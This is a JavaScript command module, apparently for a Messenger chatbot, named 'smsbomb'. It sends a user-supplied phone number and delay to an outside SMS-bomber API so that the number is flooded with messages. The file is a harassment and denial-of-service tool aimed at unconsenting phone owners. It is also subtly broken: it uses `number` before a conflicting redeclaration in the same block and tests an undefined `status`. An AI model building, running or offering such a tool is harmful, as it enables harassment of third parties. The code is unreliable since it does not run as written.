const axios = require('axios');

module.exports = {
  name: 'smsbomb',
  description: 'Send multiple SMS messages to a number with a delay',
  author: 'Deku (rest api)',
  async execute(senderId, args, pageAccessToken, sendMessage) {
    const [number, delay] = args;

    if (!number || !delay) {
      sendMessage(senderId, { text: 'Please enter number and second limit.' }, pageAccessToken);
      return;
    }

    try {
      const apiUrl = `https://smsbomber.up.railway.app/bomb?number=${number}&seconds=${delay}`;
      const response = await axios.get(apiUrl);
      
      const { number, seconds } = response.data;
      if (status) {
        sendMessage(senderId, { text: `Successfully sent SMS messages to ${number} within ${seconds}.` }, pageAccessToken);
      } else {
        sendMessage(senderId, { text: 'Failed to send SMS messages.' }, pageAccessToken);
      }
    } catch (error) {
      console.error('Error sending SMS messages:', error);
      sendMessage(senderId, { text: 'Sorry, there was an error processing your request.' }, pageAccessToken);
    }
  }
};
